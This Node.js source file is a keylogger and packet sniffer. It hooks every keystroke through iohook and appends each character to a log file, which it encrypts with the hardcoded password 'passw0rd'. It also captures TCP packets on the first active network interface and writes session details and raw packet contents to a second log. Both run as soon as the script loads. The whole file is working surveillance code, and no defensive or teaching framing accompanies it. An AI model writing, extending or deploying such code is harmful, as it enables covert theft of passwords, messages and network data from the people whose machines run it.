const fs = require('fs');
const path = require('path');
const url = require('url');
const ioHook = require('iohook');
const pcap = require('pcap');
const nodecipher = require('node-cipher');

function checkOS () {
    let os = process.platform;
    let userOS = {};
    switch (os){
        case 'darwin':
            userOS = 'darwin';
            return userOS;
        case 'win32':
            userOS = 'windows';
            return userOS;
        case 'linux' :
            userOS = 'linux';
            return userOS;
        default :
            throw 'Unknown OS';
    }
}
//pass what everever path that you want
function getPathOfLogForOs () {
    if (checkOS() === 'windows'){
        return 'C:/Programm Files/Users/';
    } else if (checkOS() === 'darwin'){
        return '';
    } else {
        //debug :
        return '';
    }
}

function createDir(){
    if (!fs.existsSync(getPathOfLogForOs().concat('logger_out'))){
        fs.mkdir(getPathOfLogForOs().concat('logger_out'));
    }
}
createDir();

function getAllInterfaceNames(){
    let interfacesRaw = JSON.parse(JSON.stringify(pcap.findalldevs()));
    let interfaceNames = [];
    for (let i in interfacesRaw){
        interfaceNames.push(interfacesRaw[i].name);
    }
    return interfaceNames;
}

function getActiveInterface(){
    let active = [];
    for (let i in getAllInterfaceNames()){
        try {
            pcap.createSession(getAllInterfaceNames()[i], "ip proto \\tcp");
            //console.log('interface with name : "', getAllInterfaceNames()[i], '" is active');
            active.push(getAllInterfaceNames()[i]);
        }catch (e) {
            //console.log('interface with name : "', getAllInterfaceNames()[i], ' doesn\'t active')
        }
    }
    return active;
}
//console.log(getActiveInterface());

function recordTcpActivity() {
    let tcp_tracker = new pcap.TCPTracker();
    let pcap_session = pcap.createSession(getActiveInterface()[0], "ip proto \\tcp");
    tcp_tracker.on('session', function (session) {
        //console.log("Start of on session between " + session.src_name + " and " + session.dst_name + " at " + new Date());
        fs.appendFile(getPathOfLogForOs().concat('logger_out/tcp_logs.txt'), "Start of on session between " +
            session.src_name + " and " + session.dst_name + " at " + new Date(), function (err) {
            if (err) throw err;
        });
        session.on('end', function (session) {
            fs.appendFile(getPathOfLogForOs().concat('logger_out/tcp_logs.txt'), "End of TCP session between " +
                session.src_name + " and " + session.dst_name + " at " + new Date(), function (err) {
                if (err) throw err;
            });
            //console.log("End of TCP session between " + session.src_name + " and " + session.dst_name + " at " + new Date());
        });
    });

    pcap_session.on('packet', function (raw_packet) {
        var packet = pcap.decode.packet(raw_packet);
        tcp_tracker.track_packet(packet);
        fs.appendFile(getPathOfLogForOs().concat('logger_out/tcp_logs.txt'), JSON.stringify(packet), function (err) {
            if (err) throw err;
        });
        //console.log(JSON.stringify(packet));
    });
}

function encript(file){
    nodecipher.encrypt({
        input: file,
        output: file + '.enc',
        password: 'passw0rd'
    });
}

function removeFile(filename){
    fs.unlink(filename, function(err) {
        if(err && err.code == 'ENOENT') {
            console.info("File doesn't exist, won't remove it.");
        } else if (err) {
            console.error("Error occurred while trying to remove file");
        } else {
            console.info('removed');
        }
    });
}

recordTcpActivity();
ioHook.on('keyup', event => {
    fs.appendFile(getPathOfLogForOs().concat('logger_out/logs.txt'), String.fromCharCode(event.rawcode), function (err) {
        if (err) throw err;
        //console.log(String.fromCharCode(event.rawcode)); //debug only
    });
    encript('logger_out/logs.txt');
});
ioHook.start();


